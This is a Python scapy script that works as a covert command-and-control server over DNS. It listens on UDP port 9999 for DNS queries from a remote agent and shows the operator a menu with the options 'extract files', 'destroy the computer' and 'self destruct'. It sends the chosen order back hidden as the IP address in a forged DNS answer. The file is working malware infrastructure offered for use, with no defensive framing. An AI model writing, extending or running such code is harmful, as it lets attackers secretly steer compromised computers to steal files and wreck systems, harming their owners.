from scapy.all import *
import struct

SERVER_PORT = 9999

MENU = "what would tou like to do?\n" \
       "1 - extract files\n" \
       "2 - destroy the computer\n" \
       "3 - self destruct\n" \
       "4 - do nothing\n"

MENU_DICT = {1: "0.0.0.1", 2: "0.0.0.2", 3: "0.0.0.3", 4: "0.0.0.0"}

def process_packet(packet):
    if packet.haslayer(UDP): ## check if needed
        udp_layer = packet[UDP]
        # The payload here is what follows the UDP header
        dns_payload = bytes(udp_layer.payload)
    else:
        return

    # Now parse the DNS header if there is enough data.
    if len(dns_payload) < 12:
        print("DNS payload too short for a header.")
        return

    transaction_id, flags, qdcount, ancount, nscount, arcount = struct.unpack("!HHHHHH", dns_payload[:12])

    domain = parse_dns_query(dns_payload)
    print("\nMessage:",domain, '\n')

    if "y" == input("Show Packet info?[y/n]"):
        print("UDP layer:")
        print("\tSource Port:", udp_layer.sport)
        print("\tDestination Port:", udp_layer.dport)
        print("\tLength:", udp_layer.len)
        print("\tChecksum:", udp_layer.chksum)

        print("DNS Header:")
        print("\tTransaction ID:", transaction_id)
        print("\tFlags:", flags)
        print("\tQuestions:", qdcount)
        print("\tAnswer RRs:", ancount)
        print("\tAuthority RRs:", nscount)
        print("\tAdditional RRs:", arcount)

    ip_command = MENU_DICT.get(int(input(MENU)), "0.0.0.0")
    send_dns = build_dns_response(transaction_id, domain, ip_command)
    send_udp = create_udp_header(udp_layer.dport, udp_layer.sport, len(send_dns))
    payload = send_udp + send_dns

    sender_ip = packet[IP].src
    response = IP(dst=sender_ip, proto=17) / Raw(load=payload)
    print(f"Sending response to {sender_ip} on port {udp_layer.sport}")
    send(response)

def parse_dns_query(data):

    # The DNS header is 12 bytes.
    if len(data) < 12:
        raise ValueError("Data too short for a DNS header.")

    # Unpack the DNS header (transaction_id, flags, QDCOUNT, ANCOUNT, NSCOUNT, ARCOUNT)
    transaction_id, flags, questions, answer_rrs, authority_rrs, additional_rrs = struct.unpack("!HHHHHH", data[:12])
    offset = 12  # Start of the Question section

    # Parse the QNAME: it's a series of labels (each label is prefixed with its length)
    labels = []
    while True:
        if offset >= len(data):
            raise ValueError("Incomplete DNS query: reached end of data while parsing QNAME.")
        length = data[offset]
        offset += 1  # move past the length byte

        if length == 0:  # a zero length indicates the end of the QNAME
            break

        if offset + length > len(data):
            raise ValueError("Invalid DNS query: label length exceeds available data.")
        label = data[offset:offset + length].decode('ascii')
        labels.append(label)
        offset += length

    # Reconstruct the domain name (QNAME)
    qname = ".".join(labels)
    return qname


def create_udp_header(src_port, dest_port, data_length):
    # UDP Header: Source Port, Destination Port, Length, Checksum (set to 0)
    length = 8 + data_length
    checksum = 0
    return struct.pack('!HHHH', src_port, dest_port, length, checksum)

def build_dns_response(transaction_id, domain, ip_command):
    """
    Builds a DNS response for an A record query.
    """
    flags = 0x8180  # Response
    question_rrs = 1  # 1 Question
    answer_rrs = 1  # 1 Answer
    authority_rrs = 0  # No authority records
    additional_rrs = 0  # No additional records

    header =  struct.pack("!HHHHHH", transaction_id, flags, question_rrs, answer_rrs, authority_rrs, additional_rrs)

    question = encode_domain_name(domain)

    qtype = 1  # Type A (IPv4 address)
    qclass = 1  # Class IN (Internet)

    q_properties = struct.pack("!HH", qtype, qclass)

    # Answer Section
    name = 0xC00C  # Pointer to domain name (compression)
    rtype = 1  # Type A (IPv4)
    rclass = 1  # Class IN
    ttl = 300 # Time-to-live (300 seconds)
    rdlength = 4  # IPv4 address length (4 bytes)
    rdata = inet_aton(ip_command)  # Convert IP to bytes

    answer = struct.pack("!HHHIH", name, rtype, rclass, ttl, rdlength) + rdata

    # Final Response
    response = header + question + q_properties + answer
    return response

def encode_domain_name(domain):
    labels = domain.split('.')
    encoded_name = b""
    for label in labels:
        encoded_name += struct.pack("B", len(label)) + label.encode()
    encoded_name += b"\x00"  # Null byte to end the domain name
    return encoded_name

def main():
    print("Server Running")
    sniff(filter=f"udp and dst port {SERVER_PORT}", prn=process_packet)

if __name__ == "__main__":
    main()
